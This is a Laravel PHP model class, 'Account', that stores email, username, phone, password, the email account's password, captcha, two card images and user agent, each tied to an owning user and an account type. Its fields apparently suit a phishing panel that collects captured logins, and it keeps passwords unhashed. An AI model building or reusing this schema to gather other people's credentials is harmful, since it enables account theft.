<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Casts\Attribute;
use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Eloquent\Relations\BelongsTo;

class Account extends Model
{
    use HasFactory;

    protected $fillable = [
        "user_id",
        "type_id",
        "email",
        "username",
        "phone",
        "password",
        "password_of_email",
        "captcha",
        "card_image1",
        "card_image2",
        "user_agent"
    ];

    protected $appends = ['time_for_humans','eup'];


    public function type(): BelongsTo
    {
        return $this->belongsTo(AccountType::class, 'type_id');
    }

    public function owner(): BelongsTo
    {
        return $this->belongsTo(User::class,'user_id');
    }

    public function timeForHumans(): Attribute
    {
        return Attribute::make(
            get: fn() => $this->created_at->diffForHumans()
        );
    }

    public function eup(): Attribute
    {
        return Attribute::make(
            get: function() {
                $output = $this->email;

                if(!$output){
                    $output = $this->username;
                }

                if(!$output){
                    $output = $this->phone;
                }

                return $output;
            }
        );
    }
}
